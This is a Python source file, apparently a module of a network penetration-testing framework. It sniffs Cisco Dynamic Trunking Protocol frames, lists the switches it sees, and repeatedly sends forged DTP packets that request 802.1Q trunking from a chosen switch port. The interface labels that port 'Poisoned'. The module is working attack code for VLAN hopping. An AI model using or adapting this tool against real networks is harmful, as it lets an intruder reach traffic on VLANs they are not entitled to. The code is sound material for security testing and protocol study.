#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  module_dtp.py
#  
#  Copyright 2014 Daniel Mende <mail@c0decafe.de>
#  

#       Redistribution and use in source and binary forms, with or without
#       modification, are permitted provided that the following conditions are
#       met:
#       
#       * Redistributions of source code must retain the above copyright
#         notice, this list of conditions and the following disclaimer.
#       * Redistributions in binary form must reproduce the above
#         copyright notice, this list of conditions and the following disclaimer
#         in the documentation and/or other materials provided with the
#         distribution.
#       * Neither the name of the  nor the names of its
#         contributors may be used to endorse or promote products derived from
#         this software without specific prior written permission.
#       
#       THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#       "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#       LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#       A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
#       OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
#       SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
#       LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
#       DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
#       THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
#       (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
#       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import struct
import threading
import time

import dnet
import dpkt

gobject = None
gtk = None
urwid = None

DTP_VERSION = 1 
DTP_DEST_MAC = "01:00:0c:cc:cc:cc"

class dtp_pdu(object):
    def __init__(self, version=None, tlvs=None):
        self.version = version
        if not tlvs is None:
            self.tlvs = tlvs
        else:
            self.tlvs = []
    
    def parse(self, data):
        (self.version,) = struct.unpack("!B", data[0])
        data = data[1:]
        while len(data) > 0:
            tlv = dtp_tlv()
            data = tlv.parse(data)
            self.tlvs.append(tlv)
    
    def render(self):
        data = struct.pack("!B", self.version)
        for i in self.tlvs:
            data += i.render()
        return data
    
    def get_tlv(self, t):
        for i in self.tlvs:
            if i.t == t:
                return i
        return None

class dtp_tlv(object):
    TYPE_DOMAIN = 0x0001
    TYPE_STATUS = 0x0002
    TYPE_TRUNK =  0x0003
    TYPE_SENDER = 0x0004    
    
    STATUS_ON       = 0x01
    STATUS_DESIRABLE= 0x03
    STATUS_AUTO     = 0x04
    
    ENCAP_ISL   = 0x02
    ENCAP_8021Q = 0x05
    
    def __init__(self, t=None, v=None):
        self.t = t
        self.v = v
    
    def __repr__(self):
        try:
            if self.t == self.TYPE_DOMAIN:
                return self.v.strip('\x00')#.encode("hex")
            elif self.t == self.TYPE_STATUS:
                t = "Access"
                m = "Off"
                d, = struct.unpack("!B", self.v[0])
                if d & 0x80 > 0:
                    t = "Trunk"
                if d & 0x07 == self.STATUS_ON:    #todo: get more administative states ?
                    m = "On"
                elif d & 0x07 == self.STATUS_DESIRABLE:
                    m = "Desirable"
                elif d & 0x07 == self.STATUS_AUTO:
                    m = "Auto"
                return "%s/%s" % (t, m)
            elif self.t == self.TYPE_TRUNK:
                t, = struct.unpack("!B", self.v[0])
                if (t & 0xe0) >> 5 == self.ENCAP_8021Q:
                    return "802.1Q"
                elif (t & 0xe0) >> 5 == self.ENCAP_ISL:
                    return "ISL"
                return "Unknown"    #todo: get more trunk states ?
            elif self.t == self.TYPE_SENDER:
                return dnet.eth_ntoa(self.v)
        except:
            pass
        return "%d, %d, %s" % (self.t, self.l, self.v.encode("hex"))
    
    def parse(self, data):
        if len(data) < 4:
            return ""
        (self.t, self.l) = struct.unpack("!HH", data[:4])
        self.v = data[4:self.l]
        return data[max(self.l, 4):]
        
    def render(self):
        return struct.pack("!HH", self.t, len(self.v)+4) + self.v

class dtp_thread(threading.Thread):
    def __init__(self, parent):
        threading.Thread.__init__(self)
        self.parent = parent
        self.running = True

    def run(self):
        self.parent.log("DTP: Thread started")
        timer = 30
        while self.running:
            if timer == 30:
                if not self.parent.target is None:
                    pdu = dtp_pdu(1, [  dtp_tlv(0x1, self.parent.target["pdu"].get_tlv(0x1).v),
                                        dtp_tlv(0x2, "\x81"),
                                        dtp_tlv(0x3, "\xa5"),#self.parent.target["pdu"].get_tlv(0x3).v),
                                        dtp_tlv(0x4, self.parent.mac)
                                     ] )
                else:
                    if self.parent.ui == 'gtk':
                        domain = self.parent.domainentry.get_text()
                    elif self.parent.ui == 'urw':
                        domain = self.parent.domain.get_edit_text()
                    pdu = dtp_pdu(1, [  dtp_tlv(0x1, domain),
                                        dtp_tlv(0x2, "\x81"),
                                        dtp_tlv(0x3, "\xa5"),
                                        dtp_tlv(0x4, self.parent.mac)
                                     ] )
                pkg = "\xaa\xaa\x03\x00\x00\x0c\x20\x04" + pdu.render()
                eth_hdr = dpkt.ethernet.Ethernet(   dst=dnet.eth_aton(DTP_DEST_MAC),
                                                    src=self.parent.mac,
                                                    type=len(pkg),
                                                    data=pkg
                                                    )
                self.parent.dnet.send(str(eth_hdr))
                timer = 0
            timer = timer + 1
            time.sleep(1)
        self.parent.log("DTP: Thread terminated")

    def shutdown(self):
        self.running = False


class mod_class(object):
    STORE_SRC_ROW = 0
    STORE_DOMAIN_ROW = 1
    STORE_STATUS_ROW = 2
    STORE_TRUNK_ROW = 3
    STORE_SENDER_ROW = 4
    STORE_STATE_ROW = 5
    
    def __init__(self, parent, platform, ui):
        self.parent = parent
        self.platform = platform
        self.ui = ui
        if ui == 'gtk':
            import gobject as gobject_
            import gtk as gtk_
            import gtk.glade as glade_
            global gobject
            global gtk
            gobject = gobject_
            gtk = gtk_
            gtk.glade = glade_
        elif ui == 'urw':
            import urwid as urwid_
            global urwid
            urwid = urwid_
            self.peerlist = None
        self.name = "dtp"
        self.group = "CISCO"
        self.gladefile = "/modules/module_dtp.glade"
        if ui == 'gtk':
            self.liststore = gtk.ListStore(str, str, str, str, str, str)
        self.thread = None
        self.mac = "\x00\x00\x00\x00\x00\x00"

    def start_mod(self):
        self.peers = {}
        self.thread = dtp_thread(self)
        self.target = None

    def shut_mod(self):
        if self.thread:
            if self.thread.is_alive():
                self.thread.shutdown()
        if self.ui == "gtk":
            self.liststore.clear()
        elif self.ui == "urw":
            if not self.peerlist is None:
                for i in self.peerlist:
                    self.peerlist.remove(i)
   
    def get_root(self):
        self.glade_xml = gtk.glade.XML(self.parent.data_dir + self.gladefile)
        dic = { "on_get_button_toggled" : self.on_get_button_toggled,
                }
        self.glade_xml.signal_autoconnect(dic)

        self.treeview = self.glade_xml.get_widget("treeview")
        self.treeview.set_model(self.liststore)
        self.treeview.set_headers_visible(True)

        column = gtk.TreeViewColumn()
        column.set_title("ETH SRC")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.STORE_SRC_ROW)
        self.treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("DOMAIN")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.STORE_DOMAIN_ROW)
        self.treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("STATUS")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.STORE_STATUS_ROW)
        self.treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("TRUNK")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.STORE_TRUNK_ROW)
        self.treeview.append_column(column)
        #~ column = gtk.TreeViewColumn()
        #~ column.set_title("SENDER")
        #~ render_text = gtk.CellRendererText()
        #~ column.pack_start(render_text, expand=True)
        #~ column.add_attribute(render_text, 'text', self.STORE_SENDER_ROW)
        #~ self.treeview.append_column(column)
        #~ column = gtk.TreeViewColumn()
        #~ column.set_title("STATE")
        #~ render_text = gtk.CellRendererText()
        #~ column.pack_start(render_text, expand=True)
        #~ column.add_attribute(render_text, 'text', self.STORE_STATE_ROW)
        #~ self.treeview.append_column(column)
        
        self.domainentry = self.glade_xml.get_widget("domainentry")
        
        return self.glade_xml.get_widget("root")
 
    def get_urw(self):
        peerlist = [ urwid.AttrMap(urwid.Text("Hosts seen:"), 'header'), urwid.Divider() ]
        self.peerlist = urwid.SimpleListWalker(peerlist)
        peerlist = urwid.LineBox(urwid.ListBox(self.peerlist))
        self.domain = urwid.Edit("DTP Domain: ")
        self.send = self.parent.menu_button("Send Trunk PDUs", self.urw_send_activated)
        return urwid.Pile([ ('weight', 8, peerlist), urwid.Filler(urwid.Columns([ self.domain, self.send ])) ])
    
    def urw_peerlist_activated(self, button, src):
        self.domain.set_edit_text(str(self.peers[src]["pdu"].get_tlv(dtp_tlv.TYPE_DOMAIN)))
        self.target = self.peers[src]
    
    def urw_send_activated(self, button):
        if not self.target is None:
            self.peerlist[self.target["row_iter"]].set_attr_map({None : "button select"})
        button.set_label("Stop Sending PDUs")
        urwid.disconnect_signal(button, 'click', self.urw_send_activated)
        urwid.connect_signal(button, 'click', self.urw_send_deactivated)
        if self.thread is None:
            self.thread = dtp_thread(self)
        if not self.thread.is_alive():
            self.thread.start()
    
    def urw_send_deactivated(self, button):
        if not self.target is None:
            self.peerlist[self.target["row_iter"]].set_attr_map({None : "button normal"})
        button.set_label("Send Trunk PDUs")
        urwid.disconnect_signal(button, 'click', self.urw_send_deactivated)
        urwid.connect_signal(button, 'click', self.urw_send_activated)
        self.target = None
        if self.thread:
            if self.thread.is_alive():
                self.thread.shutdown()
            self.thread = None
        
    def log(self, msg):
        self.__log(msg, self.name)

    def set_log(self, log):
        self.__log = log

    def set_ip(self, ip, mask):
        self.ip = dnet.ip_aton(ip)

    def set_dnet(self, dnet):
        self.dnet = dnet
        self.mac = dnet.eth.get()
        
    def get_eth_checks(self):
        return (self.check_eth, self.input_eth)
    
    def check_eth(self, eth):
        if dnet.eth_ntoa(str(eth.dst)) == DTP_DEST_MAC:
            return (True, True)
        return (False, False)
        
    def input_eth(self, eth, timestamp):
        if not eth.src == self.mac:
            src = dnet.eth_ntoa(str(eth.src))
            pdu = dtp_pdu()
            pdu.parse(str(eth.data)[8:])
            domain = pdu.get_tlv(dtp_tlv.TYPE_DOMAIN)
            status = pdu.get_tlv(dtp_tlv.TYPE_STATUS)
            trunk = pdu.get_tlv(dtp_tlv.TYPE_TRUNK)
            sender = pdu.get_tlv(dtp_tlv.TYPE_SENDER)  
            if domain is None or status is None or trunk is None or sender is None:
                return              
            if src not in self.peers:
                if self.ui == "gtk":
                    row_iter = self.liststore.append( [ src, 
                                                        str(domain),
                                                        str(status),
                                                        str(trunk),
                                                        str(sender),
                                                        ""
                                                        ] )
                elif self.ui == "urw":
                    button = self.parent.menu_button("%s - DOMAIN(%s) %s %s %s" % (src, str(domain), str(status), str(trunk), str(sender)), self.urw_peerlist_activated, src)
                    self.peerlist.append(button)
                    row_iter = self.peerlist.index(button)
                peer = {    "pdu"       :   pdu,
                            "row_iter"  :   row_iter
                            }
                self.peers[src] = peer
                self.log("DTP: Got new peer %s" % src)
            else:
                if self.ui == "gtk":
                    self.liststore.set( self.peers[src]["row_iter"], 
                                        self.STORE_DOMAIN_ROW, str(domain),
                                        self.STORE_STATUS_ROW, str(status),
                                        self.STORE_TRUNK_ROW, str(trunk),
                                        self.STORE_SENDER_ROW, str(sender)
                                      )
                elif self.ui == "urw":
                    new_button = self.parent.menu_button("%s - DOMAIN(%s) %s %s %s" % (src, str(domain), str(status), str(trunk), str(sender)), self.urw_peerlist_activated, src)
                    self.peerlist[self.peers[src]["row_iter"]] = new_button
    # SIGNALS #

    def on_get_button_toggled(self, btn):
        if btn.get_active():
            select = self.treeview.get_selection()
            (model, paths) = select.get_selected_rows()
            for i in paths:
                iter = model.get_iter(i)
                self.target = self.peers[model.get_value(iter, self.STORE_SRC_ROW)]
                model.set_value(iter, self.STORE_STATE_ROW, "Poisoned")
            if self.thread is None:
                self.thread = dtp_thread(self)
            if not self.thread.is_alive():
                self.thread.start()
        else:
            if not self.target is None:
                self.liststore.set( self.target["row_iter"],
                                    self.STORE_STATE_ROW, "")
            self.target = None
            if self.thread:
                if self.thread.is_alive():
                    self.thread.shutdown()
                self.thread = None
            
